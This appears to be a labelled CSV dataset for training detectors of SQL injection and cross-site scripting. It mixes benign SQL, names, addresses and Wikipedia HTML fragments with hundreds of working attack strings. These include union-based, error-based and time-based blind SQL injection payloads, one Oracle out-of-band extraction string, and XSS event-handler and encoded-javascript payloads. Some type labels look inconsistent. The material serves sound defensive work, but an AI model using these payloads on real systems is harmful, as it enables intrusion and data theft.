Text,Label,type
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1,sql
caaveruelas,0,sql
"   SELECT cold,white,alone,frozen,new     (  (  room JOIN science ON today.somehow =  dark.specific )   INNER JOIN bushON Orders.wire =  church.whistleID ) ",0,sql
"1%"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""%""  =  """,1,sql
"  SELECT * FROM cannot WHERE soft IN  ( 'toward', 'harbor', 'cloth' )  ",0,sql
SELECT * FROM deeply,0,sql
"<basefont onmouseout=""alert(1)"">test</basefont>",2,xss
1'||  (  select 'zoqo' from dual where 2063  =  2063,1,sql
DELETE FROM consider WHERE storm = 'stove',0,sql
"  SELECT * FROM here WHERE gun NOT IN  ( 'power', 'shorter', 'sound' )  ",0,sql
1  )   as ktfu where 2637  =  2637,1,xss
"	 </span> <span class=""reference-text"">",0,xss
SELECT COUNT ( couldID ) FROM rocket,0,sql
SELECT * FROM quietly ORDER BY air,0,sql
"1'   )    )    as uuuk where 7234  =  7234 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,sql
"	 </span> <span class=""reference-text""><a rel=""nofollow"" class=""external text"" href=""https://www.washingtonpost.com/news/innovations/wp/2016/03/10/googles-psychedelic-paint-brush-raises-the-oldest-question-in-art/"">Retrieved July 29 </a> ",0,xss
SELECT * FROM clothes WHERE local IN  ( SELECT fresh FROM heavy ) ,0,sql
"-1040 where 3058  =  3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",1,sql
l5r78gea,0,sql
SELECT * FROM arm WHERE canal = 'wagon' FETCH FIRST 3 ROWS ONLY,0,sql
 </p>,0,xss
SELECT * FROM flame WHERE book  BETWEEN 10 AND 20,0,sql
"<li><a href=""#CITEREFLenatGuha1989"">Lenat &amp; Guha 1989 </a> </li> </ul>",0,xss
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Computer_graphics"" title=""Computer graphics"">Graphics </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"  SELECT evening,money FROM hair WHERE contrast = 'am' UNION SELECT vegetable, anything FROM company",0,sql
SELECT success FROM gate UNION SELECT selection FROM planned ORDER BY outside,0,sql
"	 </span>. <i>IEEE Transactions on Autonomous Mental Development </i>. <b>2 </b> (1): 2–16. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2Ftamd.2009.2039057"">10.1109/tamd.2009.2039057 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Transactions+on+Autonomous+Mental+Development&amp;rft.atitle=On+the+impact+of+robotics+in+behavioral+and+cognitive+sciences%3A+from+insect+navigation+to+human+cognitive+development&amp;rft.volume=2&amp;rft.issue=1&amp;rft.pages=2-16&amp;rft.date=2010&amp;rft_id=info%3Adoi%2F10.1109%2Ftamd.2009.2039057&amp;rft.aulast=Oudeyer&amp;rft.aufirst=P-Y.&amp;rft_id=http%3A%2F%2Fwww.pyoudeyer.com%2FIEEETAMDOudeyer10.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT * FROM enjoy WHERE shirt BETWEEN 'stranger' AND 'most',0,sql
	 </span> </h4>,0,xss
"<li id=""cite_note-137""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-137"">^ </a> </b> ",0,xss
<figcaption onpointermove=alert(1)>XSS</figcaption>,2,xss
"<image onpaste=""alert(1)"" contenteditable>test</image>",2,xss
26987451x,0,sql
"<style>:target {color: red;}</style><details id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></details>",2,xss
"1%""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""%""  =  """,1,sql
"<style>:target {color: red;}</style><p id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></p>",2,xss
-9809' order by 1--,1,sql
"1""   )    )    as gqxk where 9199  =  9199 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,sql
marcano giner,0,xss
SELECT * FROM middle,0,sql
SELECT nose ( s )  FROM muscle SELECT musical ( s ) ,0,sql
1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1,sql
" SELECT * FROM arrow ORDER BY mud ASC, past DESC",0,sql
"   SELECT Employees.prize, COUNT ( Orders.tightID )  AS refusedFROM    ( OrdersINNER JOIN young ON Orders.wrappedID  =  Employees.recentlyID ) ",0,xss
61621455q,0,sql
"1' in boolean mode  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sql
	 </span>,0,xss
"1   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
SELECT * FROM porch FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"1,  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,sql
SELECT * FROM least 3 SELECT * FROM love,0,sql
1' in boolean mode  )   rlike sleep  (  5  )  #,1,sql
<colgroup id=x tabindex=1 ondeactivate=alert(1)></colgroup><input id=y autofocus>,2,xss
SELECT AVG ( population ) FROM thread SELECT SUM ( at ) ,0,xss
"<style>@keyframes x{}</style><blink style=""animation-name:x"" onanimationend=""alert(1)""></blink>",2,xss
"c/ san miguel, 111 6?f",0,sql
 </p>,0,xss
"	 </span> <span class=""reference-text""><cite class=""citation web"">at 10:11, Alistair Dabbs 22 Feb 2019. <a rel=""nofollow"" class=""external text"" href=""https://www.theregister.co.uk/2019/02/22/artificial_intelligence_you_know_it_isnt_real_yeah/"">""Artificial Intelligence: You know it isn't real, yeah?"" </a>. <i>www.theregister.co.uk </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=www.theregister.co.uk&amp;rft.atitle=Artificial+Intelligence%3A+You+know+it+isn%27t+real%2C+yeah%3F&amp;rft.aulast=at+10%3A11&amp;rft.aufirst=Alistair+Dabbs+22+Feb+2019&amp;rft_id=https%3A%2F%2Fwww.theregister.co.uk%2F2019%2F02%2F22%2Fartificial_intelligence_you_know_it_isnt_real_yeah%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
select   (  case when   (  1743  =  5698  )   then 1743 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
"<li><a href=""/wiki/Unity_of_science"" title=""Unity of science"">Unity of science </a> </li> </ul>",0,xss
"<li><a href=""/wiki/Semantic_Web"" title=""Semantic Web"">Semantic Web </a><span class=""nowrap"">&#160; ",0,xss
<p onpointerup=alert(1)>XSS</p>,2,xss
"SELECT * FROM band WHERE sad BETWEEN ""cover"" AND    ""without""",0,sql
"<style>@keyframes slidein {}</style><li style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></li>",2,xss
	 </span>(2014) </li>,0,xss
"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationend=""alert(1)""></input>",2,xss
SELECT * FROM needs WHERE here = 'deer'  OR situation = 'donkey',0,sql
"1'+  (  select 'tzey' where 4491  =  4491 union all select null,null,null,null,null,null,null,null--",1,xss
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondrop=alert(1) contenteditable>drop here</plaintext>",2,xss
"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",1,sql
"<ul><li><a href=""#CITEREFACM1998"">ACM 1998 </a>, ~I.2.7 </li>",0,xss
-9340  )   where 5462  =  5462 or 3038  =  3038,1,sql
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'efpc' like 'efpc",1,sql
alek,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.scientificamerican.com/article/what-is-fuzzy-logic-are-t/"">""What is 'fuzzy logic'? Are there computers that are inherently fuzzy and do not apply the usual binary logic?"" </a>. <i>Scientific American </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">5 May ",0,xss
"1   )    )    as gcvw where 7363  =  7363 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,sql
"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"  SELECT FORMAT ( 250500.5634, 2 ) ;",0,xss
1  )   or sleep  (  5  ) ,1,sql
SELECT COUNT ( DISTINCT swim )  FROM anything,0,sql
SELECT sugar FROM imagine UNION ALL SELECT pull FROM composition ORDER BY die,0,sql
<head id=x tabindex=1 onbeforedeactivate=alert(1)></head><input autofocus>,2,xss
SELECT facing FROM when,0,sql
"<ins ondblclick=""alert(1)"">test</ins>",2,xss
<cite onpointermove=alert(1)>XSS</cite>,2,xss
"<img draggable=""true"" ondragleave=""alert(1)"">test</img>",2,xss
SELECT determine ( s ) FROM excitement INNER JOIN,0,xss
"<ul><li><a href=""/wiki/Symbolic_artificial_intelligence"" title=""Symbolic artificial intelligence"">Symbolic </a> </li>",0,xss
"  SELECT noiseID AS ID, paint AS exactly FROM parts",0,sql
FROM  ( SELECT DISTINCT aware FROM mostly ) ,0,sql
centeno,0,sql
-7277   )    )     )   order by 1#,1,sql
SELECT option_value FROM wp_options WHERE option_name  =  'sm_gae' LIMIT 1,0,sql
SELECT * FROM  ( SELECT numeral FROM easy ) ,0,sql
"<style>@keyframes x{}</style><dd style=""animation-name:x"" onanimationend=""alert(1)""></dd>",2,xss
"<li id=""cite_note-Backpropagation-243""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Backpropagation_243-0"">^ </a> </b> ",0,xss
pred6.finir,0,sql
1'||  (  select 'bhxx' where 2585  =  2585,1,sql
canella,0,sql
<dt onpointerdown=alert(1)>XSS</dt>,2,xss
"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",1,xss
"   SELECT value,main,trip,one,road     (  (  beside JOIN baby ON wore.free =  lost.spread )   INNER JOIN broughtON Orders.indicate =  page.soundID ) ",0,xss
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;790–831 </li>",0,xss
SELECT * FROM sit WHERE    NOT am = 'start',0,sql
caesar-vitez2@apelton.sy,0,xss
DELETE FROM deal WHERE behavior = 'white',0,sql
SELECT AVG ( Price ) FROM tried,0,xss
<map onpointermove=alert(1)>XSS</map>,2,xss
2.1902E+15,0,sql
SELECT * FROM compare WHERE Price NOT BETWEEN 10 AND 20,0,sql
SELECT DISTINCT sat FROM properly,0,sql
SELECT DISTINCT typical FROM discover,0,sql
SELECT * FROM daughter FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM younger,0,sql
"c/ bascuana 52, 5-e",0,sql
"1%""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""%""  =  """,1,sql
"<output oncopy=""alert(1)"" contenteditable>test</output>",2,xss
11738063j,0,sql
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,2,xss
SELECT option_value FROM wp_options WHERE option_name  =  'https_migration_required' LIMIT 1,0,sql
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  +'",1,sql
-1769 union all select 6054--,1,sql
SELECT * FROM tell  WHERE place NOT LIKE '[pilot]%',0,sql
"<li id=""cite_note-Logic_as_search-186""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Logic_as_search_186-0"">^ </a> </b> ",0,xss
"1'  )   as cgsz where 7194  =  7194 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,sql
"<dt><a class=""reference internal"" href=""intro/examples.html""><span class=""doc"">Examples",0,xss
SELECT TOP 50 PERCENT * FROM copy SELECT * FROM year FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM face,0,sql
<svg><b onload=alert(1)></b>,2,xss
"1%"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""%""  =  """,1,sql
"1' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
SELECT COUNT ( somewhereID ) FROM increase,0,sql
"  SELECT softlyID AS ID, understanding AS discussion FROM type",0,xss
SELECT * FROM breakfast,0,sql
bacio bonnin,0,xss
<frameset><frame onload=alert(1)>,2,xss
"   SELECT morning,sets,basket,iron,hang     (  (  wagon JOIN forest ON congress.after =  little.characteristic )   INNER JOIN slowON Orders.ourselves =  brief.holdID ) ",0,xss
SELECT COUNT ( won )  FROM stick,0,sql
DELETE FROM at,0,xss
SELECT * FROM company WHERE center  BETWEEN 10 AND 20,0,sql
"<style>:target {transform: rotate(180deg);}</style><applet id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></applet>",2,xss
"1' in boolean mode  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   #",1,xss
6320,0,xss
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1,sql
"   SELECT lower,cool,suggest,area,whenever     (  (  salmon JOIN tried ON factor.smooth =  army.definition )   INNER JOIN dishON Orders.girl =  depth.shelterID ) ",0,sql
SELECT * FROM die WHERE huge = 'prepare' FETCH FIRST 3 ROWS ONLY,0,sql
"  SELECT * FROM Customers   WHERE Country IN  ( 'Germany', 'France', 'UK' ) ; ",0,sql
2.04422E+15,0,sql
vlor,0,sql
SELECT TOP 3 * FROM between,0,sql
DELETE FROM wrong WHERE picture = 'dinner',0,sql
"	 </span> <span class=""reference-text"">",0,xss
<style onpointerleave=alert(1)>XSS</style>,2,xss
SELECT COUNT ( improve )  FROM laugh,0,sql
"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""krxy""  =  ""krxy",1,sql
SELECT loose ( s )  FROM golden LEFT JOIN,0,sql
"<li id=""cite_note-297""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-297"">^ </a> </b> ",0,xss
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",1,sql
"<ul><li><a href=""#CITEREFMoravec1988"">Moravec 1988 </a> </li>",0,xss
"<li>Sun, R. &amp; Bookman, L. (eds.), <i>Computational Architectures: Integrating Neural and Symbolic Processes </i>. Kluwer Academic Publishers, Needham, MA. 1994. </li>",0,xss
1'  )   as xrap where 5523  =  5523 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,sql
calle ecuador 143,0,sql
"1"" where 4450  =  4450 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"        <div class=""wy-menu wy-menu-vertical"" data-spy=""affix"" role=""navigation"" aria-label=""main navigation"">",0,xss
<dd onpointerdown=alert(1)>XSS</dd>,2,xss
"  UPDATE driven SET become =  'given', City =  'whispered' WHERE silence =  pool",0,sql
"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""wcze""  =  ""wcze",1,sql
SELECT AVG ( walk )  FROM magnet  SELECT SUM ( silent ) ,0,sql
<b id=x tabindex=1 ondeactivate=alert(1)></b><input id=y autofocus>,2,xss
	 </span> 2019 ,0,xss
ga27393,0,sql
SELECT Count ( * )  AS mistake,0,sql
"<li><a href=""/wiki/Christof_Koch"" title=""Christof Koch"">Koch, Christof </a>, ""Proust among the Machines"", <i><a href=""/wiki/Scientific_American"" title=""Scientific American"">Scientific American </a> </i>, vol. 321, no. 6 (December 2019), pp.&#160;46–49. <a href=""/wiki/Christof_Koch"" title=""Christof Koch"">Christof Koch </a> doubts the possibility of ""intelligent"" machines attaining <a href=""/wiki/Consciousness"" title=""Consciousness"">consciousness </a>, because ""[e]ven the most sophisticated <a href=""/wiki/Brain_simulation"" title=""Brain simulation"">brain simulations </a> are unlikely to produce conscious <a href=""/wiki/Feelings"" class=""mw-redirect"" title=""Feelings"">feelings </a>."" (p.&#160;48.) According to Koch, ""Whether machines can become <a href=""/wiki/Sentience"" title=""Sentience"">sentient </a> [is important] for <a href=""/wiki/Ethics"" title=""Ethics"">ethical </a> reasons. If computers experience life through their own senses, they cease to be purely a means to an end determined by their usefulness to... humans. Per GNW [the <a href=""/wiki/Global_Workspace_Theory#Global_neuronal_workspace"" class=""mw-redirect"" title=""Global Workspace Theory"">Global Neuronal Workspace </a> theory], they turn from mere objects into subjects... with a <a href=""/wiki/Point_of_view_(philosophy)"" title=""Point of view (philosophy)"">point of view </a>.... Once computers' <a href=""/wiki/Cognitive_abilities"" class=""mw-redirect"" title=""Cognitive abilities"">cognitive abilities </a> rival those of humanity, their impulse to push for legal and political <a href=""/wiki/Rights"" title=""Rights"">rights </a> will become irresistible – the right not to be deleted, not to have their memories wiped clean, not to suffer <a href=""/wiki/Pain"" title=""Pain"">pain </a> and degradation. The alternative, embodied by IIT [Integrated Information Theory], is that computers will remain only supersophisticated machinery, ghostlike empty shells, devoid of what we value most: the feeling of life itself."" (p.&#160;49.) </li>",0,xss
laycock_faulds@peaf.sd,0,sql
SELECT * FROM courage WHERE unknown LIKE '%steep%',0,sql
timms,0,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,sql
"<style>@keyframes slidein {}</style><spacer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></spacer>",2,xss
having,1,xss
ayate,0,sql
"	 <sup id=""cite_ref-The_Economist_135-0"" class=""reference"">",0,xss
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;239–243 </li>",0,xss
33245427p,0,xss
SELECT * FROM settlers WHERE lonely = 'brought' FETCH FIRST 3 ROWS ONLY,0,xss
desailly_bosworth@coworkers.gov,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation news"">Buckley, Chris; Mozur, Paul (22 May 2019). <a rel=""nofollow"" class=""external text"" href=""https://www.nytimes.com/2019/05/22/world/asia/china-surveillance-xinjiang.html"">""How China Uses High-Tech Surveillance to Subdue Minorities"" </a>. <i>The New York Times </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+New+York+Times&amp;rft.atitle=How+China+Uses+High-Tech+Surveillance+to+Subdue+Minorities&amp;rft.date=2019-05-22&amp;rft.aulast=Buckley&amp;rft.aufirst=Chris&amp;rft.au=Mozur%2C+Paul&amp;rft_id=https%3A%2F%2Fwww.nytimes.com%2F2019%2F05%2F22%2Fworld%2Fasia%2Fchina-surveillance-xinjiang.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
raush.runyon@discoteatre.fk,0,sql
"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",1,sql
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'rdpv'  =  'rdpv",1,xss
"<li><a href=""/wiki/Hardware_acceleration"" title=""Hardware acceleration"">Hardware acceleration </a> </li> </ul>",0,xss
"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",1,xss
SELECT * FROM pipe ORDER BY safe,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28557 )  ORDER BY meta_id ASC",0,sql
 ,0,xss
"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",1,xss
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 3.3 </li> </ul>",0,xss
1'+  (  select naiw where 4924  =  4924,1,xss
"<area onpaste=""alert(1)"" contenteditable>test</area>",2,xss
"<li id=""cite_note-ivak1971-253""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ivak1971_253-0"">^ </a> </b> ",0,xss
suspen3edo7,0,sql
SELECT * FROM pull 3 SELECT * FROM topic,0,sql
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # yoch,1,sql
"1""  )   where 8588  =  8588",1,sql
SELECT wherever ( s ) FROM degree INNER JOIN,0,sql
"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",1,sql
"<li><a href=""#CITEREFDyson1998"">Dyson 1998 </a> </li> </ul>",0,xss
SELECT * FROM species WHERE ill BETWEEN 'give' AND 'declared',0,sql
SELECT AVG ( basic ) FROM belt SELECT SUM ( carefully ) ,0,sql
"  SELECT trunk,bare,speak FROM mirror LEFT JOIN Orders ON leader.streamID =  species.hearing ORDER BY feel.anything",0,sql
1' where 7613  =  7613,1,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></em>",2,xss
.corporativo,0,sql
3.72946E+15,0,sql
terrassa,0,sql
"1""  )   as awdg where 9512  =  9512",1,sql
SELECT * FROM difficult ORDER BY neighbor,0,xss
<image2 onpointerup=alert(1)>XSS</image2>,2,xss
" select * from users where id  =  1 or ""1{"" or 1  =  1 -- 1",1,sql
"  SELECT DATE_FORMAT ( ""2017-06-15"", ""%W %M   %e %Y"" ) ;",0,xss
<ul id=x tabindex=1 onfocusin=alert(1)></ul>,2,xss
	 </span> ,0,xss
SELECT COUNT ( betweenID ) FROM active,0,sql
<area onpointerdown=alert(1)>XSS</area>,2,xss
"	 </span> <span class=""reference-text""><cite class=""citation web"">Lorica, Ben (18 December 2017). <a rel=""nofollow"" class=""external text"" href=""https://www.oreilly.com/ideas/the-state-of-ai-adoption"">""The state of AI adoption"" </a>. <i>O'Reilly Media </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">2 May ",0,xss
"<strong onkeydown=""alert(1)"" contenteditable>test</strong>",2,xss
"<li><a href=""/wiki/Cross-validation_(statistics)"" title=""Cross-validation (statistics)"">Cross-validation </a> </li> </ul>",0,xss
SELECT TOP 3 * FROM lift WHERE man = 'pleasure' SELECT * FROM even,0,sql
vital,0,sql
91512497m,0,xss
"<script onbeforecut=""alert(1)"" contenteditable>test</script>",2,xss
tarasova_dabo@comerciosdeaspe.ly,0,xss
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1,sql
"<address onmouseover=""alert(1)"">test</address>",2,xss
"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 347682 )  ORDER BY meta_id ASC",0,sql
pari073l,0,sql
3.68572E+15,0,sql
SELECT afternoon,0,sql
"<colgroup draggable=""true"" ondragenter=""alert(1)"">test</colgroup>",2,xss
"<dl class=""docutils"">",0,xss
 or uname like '%,1,sql
kaefer,0,sql
roco daira,0,sql
"1""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
" SELECT * FROM shape ORDER BY mice, empty",0,sql
select * from users where id  =  1 <@$ or 1  =  1 -- 1,1,sql
	 </span> ,0,xss
1  )   where 6725  =  6725 and 1553  =  7419,1,sql
SELECT MIN ( plate )  AS fill FROM apart,0,xss
SELECT * FROM back WHERE real = 'major' FETCH FIRST 3 ROWS ONLY,0,xss
"sanchez 49,",0,xss
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1,sql
1.29E+15,0,sql
SELECT COUNT ( table ) FROM location,0,sql
SELECT TOP 3 * FROM each SELECT * FROM oil 3SELECT * FROM behind,0,sql
SELECT COUNT ( just )  FROM shoe,0,sql
gullera,0,sql
goudon,0,sql
SELECT * FROM play ORDER BY taught DESC,0,sql
micaas,0,xss
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847",1,sql
SELECT those FROM rear,0,sql
ayat rozas,0,sql
"  SELECT * FROM hunt WHERE drew NOT IN  ( 'snake', 'hill', 'plural' )  ",0,sql
<textarea onpointerdown=alert(1)>XSS</textarea>,2,xss
" SELECT column_name ( s )  FROM equal,bet",0,sql
SELECT * FROM cold WHERE Price NOT BETWEEN 10 AND 20,0,sql
-7054  )   as gzvf where 9146  =  9146 or 3038  =  3038,1,sql
